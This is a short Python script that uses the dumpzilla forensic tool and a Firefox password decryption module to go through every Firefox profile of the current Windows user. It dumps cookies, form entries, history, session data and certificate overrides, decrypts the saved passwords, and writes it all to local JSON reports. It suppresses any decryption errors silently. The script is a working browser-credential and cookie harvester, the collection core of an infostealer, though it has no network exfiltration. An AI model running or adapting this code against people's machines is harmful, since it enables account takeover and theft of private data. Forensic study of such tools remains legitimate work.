# https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py
# https://github.com/Busindre/dumpzilla/blob/master/dumpzilla.py

from collections import namedtuple
import dumpzilla, json, getpass, os, decrypt

if not os.path.exists("db"):
    os.makedirs("db")

user = getpass.getuser()
mozilla_profile_dir = "C:\\Users\\" + user + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"

for i in os.listdir(mozilla_profile_dir):
    mozilla_profile = os.path.join(mozilla_profile_dir, i)
    dump = dumpzilla.Dumpzilla()
    Tuple = namedtuple("Tuple", [
        "is_help_ok",
        "is_cookie_ok",
        "showdom",
        "domain",
        "name",
        "hostcookie",
        "access",
        "create",
        "secure",
        "httponly",
        "last_range",
        "create_range",
        "is_permissions_ok",
        "host",
        "type",
        "modif",
        "modif_range",
        "is_downloads_ok",
        "range",
        "is_forms_ok",
        "value",
        "forms_range",
        "is_history_ok",
        "url",
        "title",
        "date",
        "history_range",
        "is_bookmarks_ok",
        "bm_last_range",
        "bm_create_range",
        "is_cacheoff_ok",
        "cache_range",
        "extract",
        "is_keypinning_ok",
        "entry_type",
        "is_thump_ok",
        "extract_thumb",
        "Verbosity",
        "is_watch_ok",
        "text",
        "is_regexp_ok",
        "is_preferences_ok",
        "is_addon_ok",
        "is_search_ok",
        "is_passwords_ok",
        "is_cert_ok",
        "is_session_ok",
        "is_live_ok",
        "is_summary_ok",
        "is_frequency_ok",
        "Export",
        "PROFILE_DIR"
    ])

    t = Tuple(False,  # is_help_ok (bool)
        True,   # is_cookie_ok (bool)
        True,   # showdom (bool)
        [],     # domain (list)
        [],     # name (list)
        [],     # hostcookie (list)
        [],     # access (list)
        [],     # create (list)
        [],     # secure (list, could be number or string)
        [],     # httponly (list, could be number or string)
        [],     # last_range (list)
        [],     # create_range (list)
        True,   # is_permissions_ok (bool)
        [],     # host (list)
        [],     # type (list)
        [],     # modif (list)
        [],     # modif_range (list)
        True,   # is_downloads_ok (bool)
        [],     # range (list)
        True,   # is_forms_ok (bool)
        [],     # value (list)
        [],     # forms_range (list)
        True,   # is_history_ok (bool)
        [],     # url (list)
        [],     # title (list)
        [],     # date (list)
        [],     # history_range (list)
        True,   # is_bookmarks_ok (bool)
        [],     # bm_last_range (list)
        [],     # bm_create_range (list)
        True,   # is_cacheoff_ok (bool)
        [],     # cache_range (list)
        [],     # extract (list)
        True,   # is_keypinning_ok (bool)
        [],     # entry_type (list)
        True,   # is_thump_ok (bool)
        [],     # extract_thumb (list)
        [],     # Verbosity (list)
        True,   # is_watch_ok (bool)
        [],     # text (list)
        True,   # is_regexp_ok (bool)
        True,   # is_preferences_ok (bool)
        True,   # is_addon_ok (bool)
        True,   # is_search_ok (bool)
        True,   # is_passwords_ok (bool)
        True,   # is_cert_ok (bool)
        True,   # is_session_ok (bool)
        True,   # is_live_ok (bool)
        True,   # is_summary_ok (bool)
        True,   # is_frequency_ok
        [],     # Export (list)
        mozilla_profile # PROFILE_DIR
    )

    dump.args = t

    dump.init()

    dump.show_cookies(mozilla_profile)
    dump.show_preferences(mozilla_profile)
    dump.show_addons(mozilla_profile)
    dump.show_extensions(mozilla_profile)
    dump.show_info_addons(mozilla_profile)
    dump.show_search_engines(mozilla_profile)
    dump.show_downloads(mozilla_profile)
    dump.show_downloads_history(mozilla_profile)
    dump.show_downloadsdir(mozilla_profile)
    dump.show_forms(mozilla_profile)
    dump.show_history(mozilla_profile)
    dump.show_bookmarks(mozilla_profile)
    dump.show_passwords(mozilla_profile)
    dump.show_cache(mozilla_profile)
    dump.show_key_pinning(mozilla_profile)
    dump.show_cert_override(mozilla_profile)
    dump.show_session(mozilla_profile)

    try:
        moz = decrypt.MozillaInteraction(False)
        moz.load_profile(mozilla_profile)
        moz.authenticate(False)
        outputs = moz.decrypt_passwords()
        dump.total_extraction["passwords"] = outputs
        moz.unload_profile()
    except Exception as e:
        pass

    with open(f"db/report_{user}_{i}.json", "w") as f:
        f.write(json.dumps(dump.total_extraction, indent = 4))